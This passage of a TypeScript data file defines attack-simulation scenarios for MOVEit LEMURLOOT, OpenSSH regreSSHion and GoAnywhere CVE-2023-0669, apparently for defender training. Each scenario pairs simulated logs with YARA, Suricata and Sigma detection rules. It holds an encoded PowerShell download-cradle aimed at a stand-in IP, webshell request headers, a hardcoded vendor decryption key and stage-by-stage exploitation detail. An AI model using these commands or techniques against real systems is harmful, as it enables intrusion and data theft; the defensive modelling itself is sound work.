      info: 'w3wp.exe writes C:\\MOVEitTransfer\\wwwroot\\human2.aspx and spawns csc.exe to compile LEMURLOOT',
      sizeOrCode: '11,480 Bytes',
      severity: 'CRITICAL',
      mitreId: 'T1505.003',
      explanation:
        'When IIS first serves the dropped human2.aspx webshell, w3wp.exe spawns the .NET C# compiler (csc.exe) to compile App_Web_human2.aspx.dll in Temporary ASP.NET Files.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>1</EventID></System>
  <EventData>
    <Data Name="Image">C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe</Data>
    <Data Name="CommandLine">"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe" /noconfig /fullpaths @"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\root\\human2.cmdline"</Data>
    <Data Name="ParentImage">C:\\Windows\\System32\\inetsrv\\w3wp.exe</Data>
    <Data Name="User">IIS APPPOOL\\moveitdmz</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'YARA',
        title: 'Mandiant / CISA AA23-158A YARA — LEMURLOOT (human2.aspx) Webshell',
        ruleCode: `rule Mandiant_CISA_LEMURLOOT_Webshell {
  meta:
    author = "Mandiant / CISA AA23-158A"
    cve = "CVE-2023-34362"
  strings:
    $s1 = "X-siLock-Comment" ascii wide
    $s2 = "X-siLock-Step1" ascii wide
    $s3 = "AzureAccountKey" ascii wide
    $s4 = "HealthCheck Service" ascii wide
  condition:
    3 of ($s*)
}`,
        mitigation:
          'Delete human2.aspx and compiled App_Web_*.dll artifacts in Temporary ASP.NET Files, and rotate all Azure Blob Storage keys and database credentials.',
      },
    },
    {
      id: 'moveit-34362-3',
      no: 3,
      stageIndex: 3,
      timestamp: '02:41:19.830',
      sourceNodeId: 'lemurloot_webshell',
      targetNodeId: 'moveit_db_azure_blob',
      sourceLabel: 'human2.aspx (LEMURLOOT)',
      targetLabel: 'MySQL / Azure Blob Storage',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTPS 200 GZipStream',
      shortAction: 'LEMURLOOT EXFIL',
      info: 'GET /human2.aspx (X-siLock-Step1: -1) dumps Azure Blob keys, SQL metadata & GZip files',
      sizeOrCode: '48.6 MB GZip',
      severity: 'CRITICAL',
      mitreId: 'T1530',
      explanation:
        'LEMURLOOT authenticates the operator via X-siLock-Comment, queries the files/institutions/users tables, extracts Azure storage keys, and streams GZip-compressed files back over HTTPS.',
      rawLog: `GET /human2.aspx HTTP/1.1
Host: moveit.corp.local
X-siLock-Comment: 7b4e9a12-4c08-4d91-9e1b-88a12f049c11
X-siLock-Step1: -1
HTTP/1.1 200 OK
Content-Encoding: gzip
Content-Disposition: attachment; filename="files_metadata.gz"`,
      detectionRule: {
        type: 'SURICATA',
        title: 'ET WEB_SPECIFIC_APPS MOVEit Transfer LEMURLOOT X-siLock-Comment Webshell Header',
        ruleCode: `alert http any any -> $HOME_NET any (msg:"CISA AA23-158A MOVEit LEMURLOOT Webshell X-siLock-Comment Header"; flow:established,to_server; http.header_names; content:"X-siLock-Comment"; nocase; http.uri; content:".aspx"; sid:2046082; rev:1;)`,
        mitigation:
          'Audit Azure Storage Analytics logs and MOVEit database audit tables for bulk file downloads and unauthorized "HealthCheck Service" user creation.',
      },
    },
  ],
};

export const OPENSSH_REGRESSHION_CVE_2024_6387_SCENARIO: AttackScenario = {
  id: 'openssh-regreSSHion-cve-2024-6387',
  code: 'CVE-2024-6387',
  name: 'Qualys TRU & CISA — OpenSSH "regreSSHion": SIGALRM Async-Signal-Unsafe syslog() Heap RCE',
  shortSubtitle: 'Qualys Threat Research Unit · OpenSSH 8.5p1–9.7p1 · LoginGraceTime SIGALRM & glibc Heap Race',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Discovered by the Qualys Threat Research Unit (July 2024), "regreSSHion" (CVE-2024-6387) is an unauthenticated remote code execution vulnerability in OpenSSH’s server daemon (sshd) on glibc-based Linux systems. Caused by an accidental October 2020 commit that removed #ifdef DO_LOG_SAFE_IN_SIGHAND from sigdie() (reintroducing CVE-2006-5051), when a client fails to authenticate within LoginGraceTime (120 seconds), sshd’s asynchronous SIGALRM handler calls syslog(), which internally invokes async-signal-unsafe glibc malloc()/free(). By grooming the heap via public-key authentication packets and interrupting a mid-flight free() call with SIGALRM, an attacker corrupts glibc _IO_FILE vtable structures to execute arbitrary code as root.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Qualys Threat Research Unit (regreSSHion Advisory) · OpenSSH 9.8p1 · CISA Alert',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (Exploit Public App) · T1068 (Privilege Escalation / Heap Corruption) · T1059.004 (Unix Shell)',
    },
    {
      term: 'VULNERABLE CODE PATH',
      value: 'grace_alarm_handler(SIGALRM) -> sigdie() -> sshlogv() -> vsyslog() -> malloc()',
    },
    {
      term: 'KEY MITIGATION',
      value: 'Upgrade to OpenSSH 9.8p1+ or set LoginGraceTime 0 in /etc/ssh/sshd_config',
    },
  ],
  nodes: [
    {
      id: 'regresshion_attacker',
      label: 'Remote Exploit Operator',
      sublabel: '198.51.100.142 (Parallel SSH Race Client)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary Race-Condition Engine',
        pidOrPort: 'TCP :22 (MaxStartups Parallel Connections)',
        privilege: 'Unauthenticated External',
        artifacts: [
          'Crafted SSH2_MSG_USERAUTH_REQUEST (Certificate / RSA Heap Grooming)',
          'Sub-microsecond TCP timing window at LoginGraceTime (120s)',
        ],
        description:
          'Attacker opening parallel SSH sessions and sending carefully sized certificate packets to groom glibc malloc tcache/smallbins right as LoginGraceTime expires.',
      },
    },
    {
      id: 'glibc_sshd_server',
      label: 'Linux OpenSSH Server (9.6p1)',
      sublabel: '172.16.30.12 (sshd TCP :22)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Debian / Ubuntu / RHEL Linux (glibc + OpenSSH 8.5p1–9.7p1)',
        pidOrPort: 'PID 912 (/usr/sbin/sshd -D)',
        privilege: 'root (UID 0)',
        artifacts: [
          '/etc/ssh/sshd_config (LoginGraceTime 120)',
          '/var/log/auth.log ("Timeout before authentication")',
        ],
        description:
          'Internet-facing OpenSSH daemon where each unauthenticated connection forks a privileged root child with a 120-second alarm(options.login_grace_time) timer.',
      },
    },
    {
      id: 'sigalrm_syslog_race',
      label: 'SIGALRM -> syslog() Race',
      sublabel: 'grace_alarm_handler() in sshd [priv]',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Asynchronous Signal Handler Context (SIGALRM = 14)',
        pidOrPort: 'PID 14820 (sshd: [accepted] root)',
        privilege: 'root (Un-sandboxed Pre-Auth Child)',
        artifacts: [
          'grace_alarm_handler() -> sigdie("Timeout before authentication")',
          'vsyslog() -> __tzfile_read() -> fopen() -> __malloc_assert()',
        ],
        description:
          'Signal handler interrupting main-thread free() in the middle of arena bin unlinking, calling async-signal-unsafe syslog()/malloc() on inconsistent heap pointers.',
      },
    },
    {
      id: 'glibc_io_file_rce',
      label: 'glibc _IO_FILE Vtable RCE',
      sublabel: '_IO_wfile_jumps Code Execution',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'glibc Heap Arena & FILE Stream Vtable',
        pidOrPort: 'libc.so.6 (_IO_wfile_underflow -> system)',
        privilege: 'root (UID 0, GID 0)',
        artifacts: [
          'Fake _IO_FILE + _wide_data structure in 320-byte heap chunk',
          'Root shell spawned directly from privileged sshd process',
        ],
        description:
          'Overwriting a 320-byte glibc FILE structure allocated by __tzfile_read() inside syslog() redirects _IO_wfile_jumps to execute arbitrary commands as root.',
      },
    },
    {
      id: 'ssh_siem_monitor',
      label: 'Auth Log & Network SIEM',
      sublabel: 'rsyslog + Zeek SSH Connection Flood',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'SOC SIEM & Network Intrusion Detection',
        pidOrPort: '/var/log/auth.log & Zeek SSH Telemetry',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Thousands of "Timeout before authentication" auth.log entries',
          'Auditd EXECVE child spawned by sshd before user authentication',
        ],
        description:
          'Detects high-volume SSH LoginGraceTime timeout storms required to win the ASLR/heap race (~10,000 attempts) and unexpected root shells under sshd.',
      },
    },
  ],
  processTree: [
    {
      pid: 912,
      ppid: 1,
      name: 'sshd (master daemon)',
      commandLine: '/usr/sbin/sshd -D',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'normal',
      activeFromStage: 1,
      apiCalls: ['accept()', 'fork()', 'alarm(120)'],
    },
    {
      pid: 14820,
      ppid: 912,
      name: 'sshd (SIGALRM Race)',
      commandLine: 'sshd: [accepted] (interrupted inside free() by SIGALRM)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 2,
      apiCalls: [
        'free(pubkey_blob)',
        '--- SIGALRM (si_signo=14) ---',
        'grace_alarm_handler()',
        'sigdie() -> vsyslog() -> malloc(320)',
      ],
      memoryBlocks: [
        {
          address: '0x000055C48021A000',
          section: 'glibc main_arena (4 KB / 320-byte Heap Chunks)',
          permissions: 'RW-',
          size: '132 KB',
          status: 'injected',
          description:
            'Partially updated glibc smallbin / unsortedbin pointers corrupted when SIGALRM interrupts free() and triggers syslog() -> fopen("/etc/localtime").',
          hexPreview: 'Fake _IO_FILE: _flags=0x0, _wide_data=0x55c48021a140, _vtable_offset=0',
        },
      ],
    },
    {
      pid: 14829,
      ppid: 14820,
      name: 'sh (Root Shell via _IO_wfile_jumps)',
      commandLine: '/bin/sh -c /tmp/.s',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: ['_IO_wfile_underflow()', 'system()', 'execve("/bin/sh")'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'SSH HEAP GROOMING & LOGINGRACETIME EXPIRATION',
      subtitle: 'Sending crafted SSH public-key packets to arrange 4 KB and 320-byte glibc heap chunks',
      description:
        'As documented by Qualys TRU, the attacker opens repeated connections to sshd (versions 8.5p1–9.7p1) and transmits sequence-controlled SSH2_MSG_USERAUTH_REQUEST packets containing large RSA/certificate structures. This grooms the glibc heap into pairs of 4 KB and 320-byte chunks right before the 120-second LoginGraceTime timer expires.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['regresshion_attacker', 'glibc_sshd_server', 'ssh_siem_monitor'],
      compromisedNodeIds: ['glibc_sshd_server'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2024-6387 ("regreSSHion" — Regression of CVE-2006-5051)' },
        { term: 'AFFECTED VERSIONS', value: 'OpenSSH 8.5p1 through 9.7p1 on glibc Linux' },
        { term: 'TIMER TRIGGER', value: 'LoginGraceTime (120s default) -> SIGALRM (Signal 14)' },
      ],
    },
    {
      index: 2,
      title: 'SIGALRM INTERRUPTS FREE() & CALLS ASYNC-SIGNAL-UNSAFE SYSLOG()',
      subtitle: 'grace_alarm_handler -> sigdie -> syslog re-enters glibc malloc with inconsistent bin pointers',
      description:
        'At the exact microsecond the main sshd execution thread is inside glibc free() unlinking a public-key packet buffer, the kernel delivers SIGALRM. Because commit 752250ca removed #ifdef DO_LOG_SAFE_IN_SIGHAND, grace_alarm_handler() calls sigdie() -> syslog("Timeout before authentication"). Inside syslog(), glibc calls __tzfile_read() -> fopen("/etc/localtime"), which calls malloc(320) on the half-modified heap arena.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1068',
      mitreTechniqueName: 'Exploitation for Privilege Escalation',
      activeNodeIds: ['glibc_sshd_server', 'sigalrm_syslog_race', 'ssh_siem_monitor'],
      compromisedNodeIds: ['glibc_sshd_server', 'sigalrm_syslog_race'],
      keySpecs: [
        { term: 'SIGNAL HANDLER', value: 'grace_alarm_handler() -> sigdie()' },
        { term: 'UNSAFE FUNCTION', value: 'syslog() -> __tzfile_read() -> fopen() -> malloc()' },
        { term: 'HEAP PRIMITIVE', value: 'Arbitrary 320-byte chunk overlap in glibc main_arena' },
      ],
    },
    {
      index: 3,
      title: 'GLIBC _IO_FILE VTABLE HIJACK & PRE-AUTH ROOT CODE EXECUTION',
      subtitle: 'Overwriting FILE->_wide_data and _IO_wfile_jumps to run root shellcode',
      description:
        'Because fopen("/etc/localtime") allocates a 320-byte _IO_FILE structure from the corrupted heap bin that overlaps attacker-controlled packet data, the attacker overwrites the FILE stream’s _wide_data pointer and vtable (__io_vtables -> _IO_wfile_jumps). When __tzfile_read() subsequently calls __uflow() on the FILE stream, execution jumps to _IO_wfile_underflow and runs arbitrary commands as root (UID 0) outside the unprivileged sshd sandbox.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059.004',
      mitreTechniqueName: 'Command and Scripting Interpreter: Unix Shell',
      activeNodeIds: ['regresshion_attacker', 'sigalrm_syslog_race', 'glibc_io_file_rce', 'ssh_siem_monitor'],
      compromisedNodeIds: ['glibc_sshd_server', 'sigalrm_syslog_race', 'glibc_io_file_rce'],
      keySpecs: [
        { term: 'TARGET STRUCT', value: 'glibc struct _IO_FILE_plus (320 bytes)' },
        { term: 'VTABLE GADGET', value: '_IO_wfile_jumps -> _IO_wfile_underflow -> code pointer' },
        { term: 'PRIVILEGE LEVEL', value: 'Un-sandboxed root (UID 0) in privileged sshd process' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'ssh-6387-1',
      no: 1,
      stageIndex: 1,
      timestamp: '04:18:00.012',
      sourceNodeId: 'regresshion_attacker',
      targetNodeId: 'glibc_sshd_server',
      sourceLabel: '198.51.100.142',
      targetLabel: 'sshd :22 (MaxStartups)',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'sshd Auth.log Flood',
      shortAction: 'LOGINGRACETIME STORM',
      info: 'Repeated SSH connections hitting 120s LoginGraceTime timeout ("Timeout before authentication")',
      sizeOrCode: '120.000s Timeout',
      severity: 'HIGH',
      mitreId: 'T1190',
      explanation:
        'Winning the regreSSHion heap/ASLR race requires thousands of connections timing out at LoginGraceTime, producing bursts of "Timeout before authentication" in /var/log/auth.log.',
      rawLog: `Jul 01 04:18:00 srv-linux-01 sshd[14818]: Timeout before authentication for 198.51.100.142 port 51922
Jul 01 04:18:00 srv-linux-01 sshd[14819]: Timeout before authentication for 198.51.100.142 port 51924
Jul 01 04:18:00 srv-linux-01 sshd[14820]: Timeout before authentication for 198.51.100.142 port 51926`,
      detectionRule: {
        type: 'SIGMA',
        title: 'OpenSSH CVE-2024-6387 (regreSSHion) LoginGraceTime Timeout Storm',
        ruleCode: `title: OpenSSH regreSSHion CVE-2024-6387 Timeout Before Authentication Flood
logsource:
  product: linux
  service: sshd
detection:
  selection:
    Message|contains: 'Timeout before authentication for'
  condition: selection | count() by src_ip > 50
level: high`,
        mitigation:
          'Upgrade to OpenSSH 9.8p1+, or set LoginGraceTime 0 in /etc/ssh/sshd_config and enforce strict PerSourcePenalties / firewall rate-limiting on TCP/22.',
      },
    },
    {
      id: 'ssh-6387-2',
      no: 2,
      stageIndex: 2,
      timestamp: '04:18:00.019',
      sourceNodeId: 'glibc_sshd_server',
      targetNodeId: 'sigalrm_syslog_race',
      sourceLabel: 'Kernel SIGALRM (14)',
      targetLabel: 'sshd!sigdie -> syslog',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'SIGALRM / glibc Arena',
      shortAction: 'SYSLOG HEAP RACE',
      info: 'SIGALRM interrupts free() in sshd [priv]; sigdie() calls async-signal-unsafe vsyslog() -> fopen("/etc/localtime")',
      sizeOrCode: '320-Byte Overlap',
      severity: 'CRITICAL',
      mitreId: 'T1068',
      explanation:
        'Qualys TRU proved that when SIGALRM interrupts free() before main_arena bin pointers are updated, syslog() allocates a 320-byte _IO_FILE struct overlapping attacker packet buffers.',
      rawLog: `[SIGNAL_TRACE] pid=14820 comm="sshd" signo=14 (SIGALRM) interrupted_rip=libc.so.6!_int_free+0x2a4
[CALL_STACK] grace_alarm_handler -> sigdie -> sshlogv -> vsyslog -> __tzfile_read -> fopen("/etc/localtime") -> _IO_new_fopen -> malloc(320)
[HEAP_CORRUPTION] overlapping 320-byte chunk allocated at 0x55c48021a000 inside attacker-controlled RSA certificate buffer`,
      detectionRule: {
        type: 'SURICATA',
        title: 'ET EXPLOIT OpenSSH CVE-2024-6387 Large Pre-Auth Packet Grooming',
        ruleCode: `alert ssh any any -> $HOME_NET 22 (msg:"QUALYS OpenSSH CVE-2024-6387 regreSSHion High-Volume Pre-Auth Connection"; flow:to_server,established; threshold: type both, track by_src, count 40, seconds 120; sid:2054110; rev:1;)`,
        mitigation:
          'Restrict SSH access via VPN/bastion allowlists and monitor sshd child crashes (SIGSEGV / SIGABRT in dmesg).',
      },
    },
    {
      id: 'ssh-6387-3',
      no: 3,
      stageIndex: 3,
      timestamp: '04:18:00.025',
      sourceNodeId: 'sigalrm_syslog_race',
      targetNodeId: 'glibc_io_file_rce',
      sourceLabel: 'libc!_IO_wfile_underflow',
      targetLabel: '/bin/sh (UID 0)',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'Auditd SYSCALL 59',
      shortAction: 'ROOT VTABLE RCE',
      info: 'Corrupted _IO_FILE vtable (_IO_wfile_jumps) executes /bin/sh as root inside privileged pre-auth sshd',
      sizeOrCode: 'UID 0 (root)',
      severity: 'CRITICAL',
      mitreId: 'T1059.004',
      explanation:
        'When __tzfile_read() calls __uflow() on the forged _IO_FILE structure, glibc dispatches through _IO_wfile_jumps->_IO_wfile_underflow into the attacker’s code pointer as root.',
      rawLog: `type=SYSCALL msg=audit(1719807480.025:9921): arch=c000003e syscall=59 success=yes exit=0 ppid=912 pid=14820 uid=0 gid=0 euid=0 comm="sh" exe="/usr/bin/dash"
type=EXECVE msg=audit(1719807480.025:9921): argc=3 a0="/bin/sh" a1="-c" a2="/tmp/.s"`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Unauthenticated sshd Process Executing Shell Before Authentication',
        ruleCode: `title: OpenSSH Pre-Auth Root Shell Execution (CVE-2024-6387)
logsource:
  product: linux
  service: auditd
detection:
  selection:
    ParentImage|endswith: '/sshd'
    uid: 0
    Image|endswith:
      - '/sh'
      - '/bash'
  condition: selection
level: critical`,
        mitigation:
          'Patch OpenSSH to 9.8p1 where grace_alarm_handler() no longer calls async-signal-unsafe syslog() functions.',
      },
    },
  ],
};

export const FORTRA_GOANYWHERE_MFT_CVE_2023_0669_CL0P_SCENARIO: AttackScenario = {
  id: 'fortra-goanywhere-mft-cve-2023-0669-cl0p',
  code: 'CVE-2023-0669',
  name: 'Huntress, Mandiant & CISA — CL0P (TA505): Fortra GoAnywhere MFT LicenseServlet Deserialization RCE',
  shortSubtitle: 'Huntress · Mandiant · Horizon3.ai · /goanywhere/lic/accept AES-CBC & CommonsBeanutils1 Gadget',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Documented by Huntress, Mandiant, Horizon3.ai, and CISA KEV (February 2023), CVE-2023-0669 is a critical pre-authentication Java deserialization vulnerability in Fortra GoAnywhere MFT (versions prior to 7.1.2) exploited as a zero-day by the CL0P ransomware group (TA505 / FIN11) against 130+ enterprises. By sending an unauthenticated HTTP POST request to /goanywhere/lic/accept?bundle=...$2 containing a ysoserial CommonsBeanutils1 gadget chain encrypted with a hardcoded static AES-128-CBC key and IV embedded in GoAnywhere’s LicenseResponseServlet, attackers forced ObjectInputStream.readObject() to execute arbitrary commands and deploy TrueBot (Silence.Downloader) and Cobalt Strike.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Huntress Labs · Mandiant (FIN11 / TA505) · Horizon3.ai · CISA KEV CVE-2023-0669',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (Exploit Public App) · T1059.001/003 (Command Shell) · T1219 (NetSupport / Cobalt Strike)',
    },
    {
      term: 'VULNERABLE SERVLET',
      value: 'com.linoma.ga.ui.admin.servlet.LicenseResponseServlet (/goanywhere/lic/accept)',
    },
    {
      term: 'GADGET & PAYLOAD',
      value: 'ysoserial CommonsBeanutils1 (AES-CBC $2 key) -> TrueBot & Cobalt Strike Beacon',
    },
  ],
  nodes: [
    {
      id: 'ta505_cl0p_actor',
      label: 'CL0P / TA505 Operator',
      sublabel: '198.51.100.64 (ysoserial AES Bundle Sender)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary Infrastructure (CL0P / TA505)',
        pidOrPort: 'HTTPS :8000 / :8001 -> /goanywhere/lic/accept',
        privilege: 'Unauthenticated External',
        artifacts: [
          'POST /goanywhere/lic/accept (bundle=<Base64URL_AES>$2)',
          'ysoserial CommonsBeanutils1 TemplatesImpl bytecode',
        ],
        description:
          'Threat actor encrypting a ysoserial CommonsBeanutils1 serialized object using GoAnywhere’s hardcoded PBKDF2/AES-CBC key ("go@nywhereLicenseP@$$w0rd") and sending it to /goanywhere/lic/accept.',
      },
    },
    {
      id: 'goanywhere_tomcat_host',
      label: 'GoAnywhere MFT Server',
      sublabel: '172.16.40.25 (Admin Portal :8000/:8001)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Windows Server 2019 / Linux (Apache Tomcat + GoAnywhere MFT < 7.1.2)',
        pidOrPort: 'PID 3920 (tomcat9.exe / java.exe)',
        privilege: 'NT AUTHORITY\\SYSTEM',
        artifacts: [
          'com.linoma.ga.ui.admin.servlet.LicenseResponseServlet',
          'C:\\Program Files\\Fortra\\GoAnywhere\\userdata\\logs\\goanywhere.log',
        ],
        description:
          'GoAnywhere MFT server whose LicenseResponseServlet is reachable without authentication and decrypts the bundle parameter using a static hardcoded key.',
      },
    },
    {
      id: 'commons_beanutils_gadget',
      label: 'CommonsBeanutils1 Deserializer',
      sublabel: 'ObjectInputStream.readObject -> TemplatesImpl',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'JVM In-Memory Deserialization Chain (tomcat9.exe)',
        pidOrPort: 'PID 3920 -> PID 7144 (cmd.exe / powershell.exe)',
        privilege: 'NT AUTHORITY\\SYSTEM',
        artifacts: [
          'org.apache.commons.beanutils.BeanComparator.compare()',
          'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()',
        ],
        description:
          'When LicenseResponseServlet calls ObjectInputStream.readObject() on the decrypted bundle, PriorityQueue triggers BeanComparator -> TemplatesImpl.getOutputProperties() to instantiate attacker bytecode.',
      },
    },
    {
      id: 'truebot_cobalt_stage',
      label: 'TrueBot & Cobalt Strike Stage',
      sublabel: 'rundll32.exe & NetSupport RAT',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Post-Exploitation Loader (TrueBot / Silence.Downloader)',
        pidOrPort: 'PID 7812 (rundll32.exe C:\\ProgramData\\acl.dll)',
        privilege: 'NT AUTHORITY\\SYSTEM',
        artifacts: [
          'TrueBot (Silence.Downloader) & NetSupport Manager',
          'Exfiltration of GoAnywhere SFTP/FTPS customer vaults',
        ],
        description:
          'Post-exploitation stage documented by Huntress and Mandiant where tomcat9.exe spawns PowerShell/rundll32 to deploy TrueBot, Cobalt Strike, and exfiltrate MFT customer files.',
      },
    },
    {
      id: 'mft_siem_detector',
      label: 'SIEM & GoAnywhere Log Sensor',
      sublabel: 'goanywhere.log + Sysmon EID 1',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'Enterprise SIEM & Endpoint Detection',
        pidOrPort: 'goanywhere.log InvocationTargetException & Sysmon EID 1',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'java.lang.reflect.InvocationTargetException in LicenseResponseServlet',
          'tomcat9.exe / java.exe spawning cmd.exe or powershell.exe',
        ],
        description:
          'Detects the signature InvocationTargetException stack trace in userdata/logs/goanywhere.log and child shells spawned by the GoAnywhere Tomcat service.',
      },
    },
  ],
  processTree: [
    {
      pid: 3920,
      ppid: 712,
      name: 'tomcat9.exe (GoAnywhere MFT)',
      commandLine: '"C:\\Program Files\\Fortra\\GoAnywhere\\tomcat\\bin\\tomcat9.exe" //RS//GoAnywhere',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: ['LicenseResponseServlet.doPost()', 'Cipher.doFinal(AES/CBC/PKCS5Padding)', 'ObjectInputStream.readObject()'],
    },
    {
      pid: 7144,
      ppid: 3920,
      name: 'cmd.exe (Gadget Execution)',
      commandLine: 'cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA2ADQALwBzAHQAYQBnAGUAMQAiACkA',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 2,
      apiCalls: ['CreateProcessW("powershell.exe")', 'WriteFile("C:\\ProgramData\\acl.dll")'],
    },
    {
      pid: 7812,
      ppid: 7144,
      name: 'rundll32.exe (TrueBot / Cobalt Strike)',
      commandLine: 'rundll32.exe C:\\ProgramData\\acl.dll,Menu',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 3,
      apiCalls: ['VirtualAlloc(PAGE_EXECUTE_READWRITE)', 'WinHttpConnect("198.51.100.64")'],
      memoryBlocks: [
        {
          address: '0x0000021C40800000',
          section: 'TemplatesImpl Translet + TrueBot / Beacon',
          permissions: 'RWX',
          size: '284 KB',
          status: 'injected',
          description:
            'In-memory Java Translet bytecode from CommonsBeanutils1 spawning TrueBot and Cobalt Strike Beacon.',
          hexPreview: 'CA FE BA BE 00 00 00 34 (TemplatesImpl Java Class) -> Runtime.getRuntime().exec()',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'ENCRYPTED BUNDLE POST TO /GOANYWHERE/LIC/ACCEPT (CVE-2023-0669)',
      subtitle: 'Bypassing authentication and decrypting the bundle parameter with the static "$2" AES key',
      description:
        'The attacker sends an unauthenticated HTTP POST request to /goanywhere/lic/accept with parameter bundle=<Base64URL>$2. Because LicenseResponseServlet is exempted from authentication filters and uses a hardcoded static initialization vector ("AES/CBC/PKCS5Padding") and key ("go@nywhereLicenseP@$$w0rd" derived via PBKDF2 when suffixed with "$2"), any attacker can encrypt a arbitrary serialized Java object that the server willingly decrypts.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['ta505_cl0p_actor', 'goanywhere_tomcat_host', 'mft_siem_detector'],
      compromisedNodeIds: ['goanywhere_tomcat_host'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2023-0669 (Pre-Auth Java Deserialization)' },
        { term: 'ENDPOINT URI', value: 'POST /goanywhere/lic/accept (bundle=...$2)' },
        { term: 'HARDCODED CRYPTO', value: 'AES/CBC/PKCS5Padding + Static Key "go@nywhereLicenseP@$$w0rd"' },
      ],
    },
    {
      index: 2,
      title: 'COMMONSBEANUTILS1 GADGET DESERIALIZATION & SYSTEM SHELL',
      subtitle: 'ObjectInputStream.readObject triggers BeanComparator -> TemplatesImpl.newTransformer()',
      description:
        'After decrypting and Base64-decoding the bundle parameter, LicenseTools.unserialize() passes the byte stream directly into standard Java ObjectInputStream.readObject(). The attacker’s ysoserial CommonsBeanutils1 gadget chain uses java.util.PriorityQueue and org.apache.commons.beanutils.BeanComparator to invoke TemplatesImpl.getOutputProperties(), loading malicious Java bytecode in memory and spawning cmd.exe / powershell.exe as NT AUTHORITY\\SYSTEM.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059.003',
      mitreTechniqueName: 'Command and Scripting Interpreter: Windows Command Shell',
      activeNodeIds: ['goanywhere_tomcat_host', 'commons_beanutils_gadget', 'mft_siem_detector'],
      compromisedNodeIds: ['goanywhere_tomcat_host', 'commons_beanutils_gadget'],
      keySpecs: [
        { term: 'GADGET CHAIN', value: 'PriorityQueue -> BeanComparator -> TemplatesImpl.newTransformer()' },
        { term: 'LOG SIGNATURE', value: 'java.lang.reflect.InvocationTargetException in goanywhere.log' },
        { term: 'CHILD PROCESS', value: 'tomcat9.exe -> cmd.exe /c powershell -enc ...' },
      ],
    },
    {
      index: 3,
      title: 'TRUEBOT / COBALT STRIKE DEPLOYMENT & MFT VAULT EXFILTRATION',
      subtitle: 'Deploying TrueBot (acl.dll), NetSupport RAT, and exfiltrating stored customer files',
      description:
        'As documented by Huntress and Mandiant (FIN11), the initial PowerShell stager drops and executes TrueBot (Silence.Downloader via rundll32.exe C:\\ProgramData\\acl.dll,Menu), establishes redundant persistence with NetSupport Manager and Cobalt Strike beacons, dumps Active Directory credentials, and exfiltrates sensitive files stored in GoAnywhere MFT transfer repositories.',
      mitreTacticPhase: 7,
      mitreTechniqueId: 'T1219',
      mitreTechniqueName: 'Remote Access Software',
      activeNodeIds: ['ta505_cl0p_actor', 'commons_beanutils_gadget', 'truebot_cobalt_stage', 'mft_siem_detector'],
      compromisedNodeIds: ['goanywhere_tomcat_host', 'commons_beanutils_gadget', 'truebot_cobalt_stage'],
      keySpecs: [
        { term: 'FIRST-STAGE LOADER', value: 'TrueBot (Silence.Downloader) via rundll32.exe' },
        { term: 'SECONDARY ACCESS', value: 'Cobalt Strike Beacon & NetSupport Manager RAT' },
